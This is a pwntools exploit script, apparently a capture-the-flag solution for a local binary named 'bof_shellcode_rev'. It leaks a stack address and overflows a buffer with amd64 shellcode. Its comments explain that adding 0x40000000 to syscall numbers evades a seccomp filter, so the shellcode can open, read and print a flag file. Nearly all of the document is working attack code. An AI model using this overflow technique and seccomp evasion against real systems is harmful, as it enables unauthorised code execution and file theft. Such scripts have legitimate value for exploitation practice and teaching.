from pwn import *

context.arch = 'amd64'
p = process('./bof_shellcode_rev')
#p = gdb.debug('./bof_shellcode', 'b main')

# use syscall number + 0x40000000 to bypass sccomp
# can't use execve because command like ls, cat or other will also use execve it will be detected by seccomp
# so use open(path, 0, 0), read(fp, rsp, size), write(1, rsp, size) to write the flag on the screen
shellcode = asm(
    '''
    mov rax, 0x67616c66
    push rax
    mov rax, 0x2f37383636353570
    push rax
    mov rax, 0x706f2f656d6f682f
    push rax
    mov rdi, rsp
    mov rax, 2+0x40000000
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x60
    xor rax, rax
    syscall

    mov rdi, 1
    mov rax, 1+0x40000000
    syscall
    ''', arch = 'amd64')

p.recvuntil('input ')
stack = p.recvline().strip()
stack = int(stack, 16)
payload = shellcode
payload += b'a'*(120-len(payload))
payload += p64(stack)
p.sendlineafter(':', payload)
p.recv()

p.interactive()
